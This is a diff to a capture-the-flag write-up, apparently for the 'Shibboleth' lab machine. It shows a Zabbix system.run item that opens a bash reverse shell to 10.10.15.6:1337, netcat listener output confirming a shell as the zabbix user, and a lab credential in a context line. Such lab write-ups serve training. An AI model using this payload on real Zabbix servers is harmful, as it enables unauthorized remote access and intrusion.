@@ -140,8 +140,22 @@ Administrator -> ilovepumkinpie1
 
 ### Shell Shoveled back on Zabbix
 
+Configuration > Hosts > Items > New item
+
 ````zabbix
-system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.19/4444 0>&1",nowait]
+system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.6/1337 0>&1",nowait]
+````
+
+````shell
+root@kali:~/Desktop/shibboleth# nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.6] from (UNKNOWN) [10.10.11.124] 33844
+bash: cannot set terminal process group (884): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@shibboleth:/$ id
+id
+uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
+
 ````
 
 
